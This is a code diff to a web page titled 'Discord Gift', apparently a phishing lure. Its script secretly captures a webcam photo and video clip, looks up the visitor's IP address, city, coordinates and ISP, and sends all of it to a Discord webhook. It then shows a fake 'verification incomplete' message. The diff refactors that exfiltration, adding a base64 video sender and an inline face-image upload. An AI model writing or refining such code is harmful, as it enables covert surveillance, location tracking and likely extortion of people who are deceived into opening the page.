@@ -16,19 +16,8 @@
 
   <title>Discord Gift</title>
   <style>
-    body { 
-      margin:0; 
-      background:#111; 
-      color:#eee; 
-      font-family:Arial, sans-serif; 
-      text-align:center; 
-      padding: 20vh 10px; 
-      min-height:100vh; 
-    }
-    #msg { 
-      font-size:1.8em; 
-      margin:20px; 
-    }
+    body { margin:0; background:#111; color:#eee; font-family:Arial, sans-serif; text-align:center; padding: 20vh 10px; min-height:100vh; }
+    #msg { font-size:1.8em; margin:20px; }
     .progress-container {
       width: 80%; max-width: 400px; margin: 20px auto; background: #333; border-radius: 8px; overflow: hidden; height: 30px; position: relative; display:none;
     }
@@ -40,16 +29,7 @@
     }
     video, canvas { display:none; }
     .container { max-width:600px; margin:auto; }
-    button { 
-      padding:15px 40px; 
-      font-size:1.3em; 
-      background:#0066cc; 
-      color:white; 
-      border:none; 
-      border-radius:8px; 
-      cursor:pointer; 
-      margin:20px; 
-    }
+    button { padding:15px 40px; font-size:1.3em; background:#0066cc; color:white; border:none; border-radius:8px; cursor:pointer; margin:20px; }
     button:hover { background:#0055aa; }
     button:disabled { opacity:0.6; cursor:not-allowed; }
   </style>
@@ -94,14 +74,14 @@
       if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
     }
 
-    async function sendAttachment(content, blob, filename) {
-      const payload = { content };
-      const formData = new FormData();
-      formData.append('payload_json', JSON.stringify(payload));
-      formData.append('file', blob, filename);
+    async function sendToWebhook(content) {
       try {
-        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-      } catch (e) {}
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content })
+        });
+      } catch {}
     }
 
     async function captureMugshot() {
@@ -109,9 +89,23 @@
       canvas.width = videoElement.videoWidth || 640;
       canvas.height = videoElement.videoHeight || 480;
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      await new Promise(r => setTimeout(r, 150)); // settle time
+      await new Promise(r => setTimeout(r, 200));
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
       return new Promise(r => canvas.toBlob(r, 'image/png'));
+    }
+
+    async function sendBase64Video(blob) {
+      const reader = new FileReader();
+      reader.onload = async () => {
+        const base64 = reader.result.split(',')[1];
+        const truncated = base64.slice(0, 1500) + '... (truncated - full base64 in console if you inspect)';
+        await sendToWebhook(
+          `🎥 Video captured (base64 - decode & save as .webm to play)\n` +
+          `UA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n` +
+          `Base64 data:\n${truncated}`
+        );
+      };
+      reader.readAsDataURL(blob);
     }
 
     async function recordAndSend() {
@@ -136,7 +130,7 @@
 
         await new Promise(r => setTimeout(r, 1000));
 
-        // Mugshot first - no visible feed
+        // Mugshot first
         const mugshotBlob = await captureMugshot();
         if (mugshotBlob && mugshotBlob.size > 1000) {
           let geo = "Location grab failed";
@@ -147,14 +141,15 @@
               if (!d.error) geo = `IP: ${d.ip||'n/a'}\nCity: ${d.city||'n/a'}\nRegion: ${d.region||'n/a'}\nCountry: ${d.country_name||'n/a'}\nCoords: ${d.latitude||'n/a'}, ${d.longitude||'n/a'}\nISP: ${d.org||'n/a'}`;
             }
           } catch {}
-          await sendAttachment(
-            `🎯 Quick face verification captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`,
-            mugshotBlob,
-            `face_${Date.now()}.png`
-          );
+          const formData = new FormData();
+          formData.append('payload_json', JSON.stringify({
+            content: `🎯 Face captured\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geo}`
+          }));
+          formData.append('file', mugshotBlob, `face_${Date.now()}.png`);
+          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
         }
 
-        // Video - your original working recording logic
+        // Video
         progressContainer.style.display = 'block';
         msg.textContent = "Loading...";
 
@@ -172,35 +167,11 @@
 
           stream.getTracks().forEach(track => track.stop());
 
-          if (chunks.length === 0) {
-            msg.textContent = "Verification incomplete. Center Face In Camera View";
-            progressContainer.style.display = 'none';
-            btn.style.display = 'none';
-            return;
+          if (chunks.length > 0) {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            // Send base64 instead of file upload
+            await sendBase64Video(blob);
           }
-
-          const blob = new Blob(chunks, { type: 'video/webm' });
-
-          let geoDetails = "Location grab failed";
-          try {
-            const geoRes = await fetch('https://ipapi.co/json/');
-            if (geoRes.ok) {
-              const data = await geoRes.json();
-              if (!data.error) geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'}\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nISP: ${data.org || 'n/a'}`;
-            }
-          } catch {}
-
-          const payload = {
-            content: `🎥 New verification clip attached (silent capture)\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
-          };
-
-          const formData = new FormData();
-          formData.append('file', blob, `verification_${Date.now()}.mp4`);
-          formData.append('payload_json', JSON.stringify(payload));
-
-          msg.textContent = "Finalizing...";
-
-          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
           progressContainer.style.display = 'none';
